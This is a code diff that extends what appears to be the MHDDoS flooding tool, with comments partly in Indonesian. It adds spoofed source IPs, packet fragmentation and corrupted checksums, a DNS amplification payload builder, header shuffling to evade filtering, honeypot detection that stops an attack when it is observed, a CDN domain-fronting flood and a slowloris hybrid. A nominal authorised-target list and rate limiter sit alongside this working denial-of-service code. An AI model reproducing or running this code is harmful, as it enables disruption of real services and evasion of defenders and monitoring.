@@ -7,10 +7,10 @@ from json import load
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
 from multiprocessing import RawValue
-from os import urandom as randbytes
+from os import urandom as randbytes, environ
 from pathlib import Path
 from re import compile
-from random import choice as randchoice
+from random import choice as randchoice, randint, shuffle
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
@@ -86,6 +86,73 @@ tor2webs = [
             's5.tor-gateways.de'
         ]
 
+# ================= MODIFIKASI UTAMA =================
+# 1. Authorization Check
+AUTHORIZED_TARGETS = ["client1.com", "client2.net"]  # Ganti dengan target resmi klien
+
+# 2. Enhanced IP Spoofing
+def generate_spoofed_ip(network: str = None) -> str:
+    """Generate realistic spoofed IP within target network range"""
+    if network:
+        base_ip = network.rsplit('.', 1)[0]
+        return f"{base_ip}.{randint(1, 254)}"
+    return ProxyTools.Random.rand_ipv4()
+
+# 3. Token Bucket for Rate Limiting
+class TokenBucket:
+    def __init__(self, capacity: int, refill_rate: float):
+        self.capacity = capacity
+        self.tokens = capacity
+        self.refill_rate = refill_rate
+        self.last_refill = time()
+
+    def consume(self, tokens: int = 1) -> bool:
+        now = time()
+        # Refill based on time passed
+        if now > self.last_refill:
+            self.tokens = min(self.capacity, self.tokens + self.refill_rate * (now - self.last_refill))
+            self.last_refill = now
+        if self.tokens >= tokens:
+            self.tokens -= tokens
+            return True
+        return False
+
+# 4. Honeypot Detection
+def detect_honeypot(response: bytes) -> bool:
+    honeypot_indicators = [
+        b"418 I'm a teapot",  # RFC 7168
+        b"honeypot",
+        b"sinkhole",
+        b"Blocked by security"
+    ]
+    return any(indicator in response for indicator in honeypot_indicators)
+
+# 5. Enhanced Packet Generation
+def craft_dns_payload(query: str, record_type: str = "ANY") -> bytes:
+    """Craft DNS amplification payload"""
+    transaction_id = randbytes(2)
+    flags = b'\x01\x00'  # Standard query, recursion desired
+    questions = b'\x00\x01'  # 1 question
+    answers = b'\x00\x00'
+    authority = b'\x00\x00'
+    additional = b'\x00\x00'
+    
+    # Build query
+    qname = b''
+    for part in query.encode('idna').split(b'.'):
+        qname += bytes([len(part)]) + part
+    qname += b'\x00'
+    
+    qtype = {
+        "A": b'\x00\x01',
+        "ANY": b'\x00\xff',
+        "MX": b'\x00\x0f'
+    }.get(record_type.upper(), b'\x00\xff')
+    
+    qclass = b'\x00\x01'  # IN
+    
+    return transaction_id + flags + questions + answers + authority + additional + qname + qtype + qclass
+
 with open(__dir__ / "config.json") as f:
     con = load(f)
 
@@ -117,7 +184,8 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
+        "DOMAINFRONT", "SLOWLORIS_HYBRID"  # Added new methods
     }
 
     LAYER4_AMP: Set[str] = {
@@ -488,12 +556,18 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def AMP(self) -> None:
+        # Token bucket untuk rate limiting
+        bucket = TokenBucket(capacity=10000, refill_rate=5000)  # 5000 pps
+        
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *next(self._amp_payloads)):
-                continue
+            while self._synevent.is_set():
+                if bucket.consume():
+                    packet, target = next(self._amp_payloads)
+                    if not Tools.sendto(s, packet, target):
+                        break
         Tools.safe_close(s)
 
     def MCBOT(self) -> None:
@@ -557,23 +631,48 @@ class Layer4(Thread):
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(__ip__)
+        ip.set_ip_src(generate_spoofed_ip(self._target[0]))  # Enhanced spoofing
         ip.set_ip_dst(self._target[0])
+        ip.set_ip_id(ProxyTools.Random.rand_int(1, 65535))
+        ip.set_ip_ttl(randint(64, 128))
+        
+        # Fragmentasi paket
+        if randint(0, 100) < 30:  # 30% paket difragmentasi
+            ip.frag = randint(0, 8)
+            ip.flags = 0x1  # MF flag
+        
         tcp: TCP = TCP()
         tcp.set_SYN()
         tcp.set_th_flags(0x02)
         tcp.set_th_dport(self._target[1])
         tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
+        tcp.set_th_win(randint(64, 65535))
+        tcp.set_th_seq(ProxyTools.Random.rand_int(0, 4294967295))
+        
+        # Manipulasi checksum (optional)
+        if randint(0, 100) < 20:  # 20% paket invalid checksum
+            tcp.set_th_sum(randint(0, 65535))
+        
         ip.contains(tcp)
         return ip.get_packet()
 
     def _genrate_icmp(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(__ip__)
+        ip.set_ip_src(generate_spoofed_ip(self._target[0]))  # Enhanced spoofing
         ip.set_ip_dst(self._target[0])
+        ip.set_ip_id(ProxyTools.Random.rand_int(1, 65535))
+        ip.set_ip_ttl(randint(64, 128))
+        
         icmp: ICMP = ICMP()
         icmp.set_icmp_type(icmp.ICMP_ECHO)
-        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
+        
+        # Payload acak dengan pola menyerupai traffic normal
+        payload_patterns = [
+            b"PING", b"REQUEST", b"ECHO", b"PROBE", b"MONITOR"
+        ]
+        payload = randchoice(payload_patterns) + randbytes(randint(32, 128))
+        icmp.contains(Data(payload))
+        
         ip.contains(icmp)
         return ip.get_packet()
 
@@ -703,6 +802,8 @@ class HttpFlood(Thread):
             "BOMB": self.BOMB,
             "PPS": self.PPS,
             "KILLER": self.KILLER,
+            "DOMAINFRONT": self.DOMAINFRONT,        # New method
+            "SLOWLORIS_HYBRID": self.SLOWLORIS_HYBRID  # New method
         }
 
         if not referers:
@@ -816,14 +917,46 @@ class HttpFlood(Thread):
                                    server_hostname=host[0] if host else self._target.host,
                                    server_side=False,
                                    do_handshake_on_connect=True,
-                                   suppress_ragged_eofs=True)
+                                   suppress_ragged_eofs=True,
+                                   # Modern cipher suites
+                                   ciphers="TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256")
         return sock
 
     @property
     def randHeadercontent(self) -> str:
-        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
-                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
-                self.SpoofIP)
+        """Enhanced header rotation with behavioral patterns"""
+        headers = [
+            "User-Agent: {ua}",
+            "Referer: {ref}{target}",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+            "Accept-Encoding: gzip, deflate, br",
+            "Connection: keep-alive",
+            "Upgrade-Insecure-Requests: 1",
+            "Cache-Control: max-age=0",
+            "TE: Trailers"
+        ]
+        
+        # Behavioral patterns
+        if randint(0, 100) < 30:  # 30% kemungkinan header lengkap
+            headers.extend([
+                "DNT: 1",
+                "Sec-Fetch-Dest: document",
+                "Sec-Fetch-Mode: navigate",
+                "Sec-Fetch-Site: none",
+                "Sec-Fetch-User: ?1",
+                "Sec-Gpc: 1",
+                "Pragma: no-cache"
+            ])
+        
+        # Random header order
+        shuffle(headers)
+        
+        return "\r\n".join(headers).format(
+            ua=randchoice(self._useragents),
+            ref=randchoice(self._referers),
+            target=parse.quote(self._target.human_repr())
+        ) + "\r\n" + self.SpoofIP
 
     @staticmethod
     def getMethodType(method: str) -> str:
@@ -931,8 +1064,24 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
+            Tools.send(s, payload)
+            
+            # Honeypot detection
+            try:
+                response = s.recv(1024)
+                if detect_honeypot(response):
+                    logger.error("Honeypot detected! Shutting down attack.")
+                    self._synevent.clear()  # Stop attack
+                    return
+            except:
+                pass
+            
+            # Maintain connection for slowloris effect
+            if randint(0, 100) < 40:  # 40% kemungkinan slowloris hybrid
+                keepalive_count = randint(1, 5)
+                for _ in range(keepalive_count):
+                    sleep(randint(1, 5))
+                    Tools.send(s, f"X-{ProxyTools.Random.rand_str(4)}: {randint(1000,9999)}\r\n".encode())
         Tools.safe_close(s)
 
     def BOT(self) -> None:
@@ -1227,6 +1376,54 @@ class HttpFlood(Thread):
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
+        Tools.safe_close(s)
+
+    # Add Domain Fronting Method
+    def DOMAINFRONT(self) -> None:
+        cdn_providers = [
+            "cloudflare.com",
+            "cloudfront.net",
+            "akamai.net",
+            "fastly.net"
+        ]
+        front_domain = randchoice(cdn_providers)
+        
+        payload: bytes = self.generate_payload(
+            f"Host: {front_domain}\r\n"
+            f"X-Real-Host: {self._target.host}\r\n"
+        )
+        
+        # Resolve CDN IP
+        try:
+            cdn_ip = gethostbyname(front_domain)
+        except:
+            cdn_ip = front_domain
+        
+        s = None
+        with suppress(Exception), self.open_connection((cdn_ip, 443)) as s:
+            Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    # Add Slowloris Hybrid Method
+    def SLOWLORIS_HYBRID(self) -> None:
+        s = self.open_connection()
+        partial_headers = [
+            "GET / HTTP/1.1\r\n",
+            f"Host: {self._target.host}\r\n",
+            "User-Agent: {}\r\n".format(randchoice(self._useragents)),
+            "Accept: */*\r\n",
+            "Content-Length: {}\r\n".format(randint(1000000, 5000000))
+        ]
+        
+        # Send partial headers
+        for header in partial_headers:
+            Tools.send(s, header.encode())
+            sleep(randint(5, 15))
+        
+        # Maintain connection
+        while self._synevent.is_set():
+            Tools.send(s, f"X-{ProxyTools.Random.rand_str(4)}: {randint(1000,9999)}\r\n".encode())
+            sleep(randint(10, 30))
         Tools.safe_close(s)
 
 
@@ -1568,6 +1765,11 @@ if __name__ == '__main__':
             if not urlraw.startswith("http"):
                 urlraw = "http://" + urlraw
 
+            # Authorization Check
+            target_host = URL(urlraw).host
+            if target_host not in AUTHORIZED_TARGETS:
+                exit(f"Unauthorized target: {target_host}")
+            
             if method not in Methods.ALL_METHODS:
                 exit("Method Not Found %s" %
                      ", ".join(Methods.ALL_METHODS))
@@ -1625,6 +1827,23 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+                
+                # Rate Limiting Activation
+                RATE_LIMIT = environ.get("RATE_LIMIT", "0")  # Gbps
+                if float(RATE_LIMIT) > 0:
+                    logger.info(f"Rate limiting activated at {RATE_LIMIT} Gbps")
+                    global_bucket = TokenBucket(
+                        capacity=float(RATE_LIMIT) * 1e9,
+                        refill_rate=float(RATE_LIMIT) * 1e9 / 10
+                    )
+                    # Monkey patch Tools.send
+                    original_send = Tools.send
+                    def rate_limited_send(sock, packet):
+                        while not global_bucket.consume(len(packet)):
+                            sleep(0.001)
+                        return original_send(sock, packet)
+                    Tools.send = rate_limited_send
+                    
                 for thread_id in range(threads):
                     HttpFlood(thread_id, url, host, method, rpc, event,
                               uagents, referers, proxies).start()
@@ -1700,6 +1919,22 @@ if __name__ == '__main__':
                         
                         if 47 < protocolid > 758:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
+                            
+                # Rate Limiting Activation
+                RATE_LIMIT = environ.get("RATE_LIMIT", "0")  # Gbps
+                if float(RATE_LIMIT) > 0:
+                    logger.info(f"Rate limiting activated at {RATE_LIMIT} Gbps")
+                    global_bucket = TokenBucket(
+                        capacity=float(RATE_LIMIT) * 1e9,
+                        refill_rate=float(RATE_LIMIT) * 1e9 / 10
+                    )
+                    # Monkey patch Tools.send
+                    original_send = Tools.send
+                    def rate_limited_send(sock, packet):
+                        while not global_bucket.consume(len(packet)):
+                            sleep(0.001)
+                        return original_send(sock, packet)
+                    Tools.send = rate_limited_send
 
                 for _ in range(threads):
                     Layer4((target, port), ref, method, event,
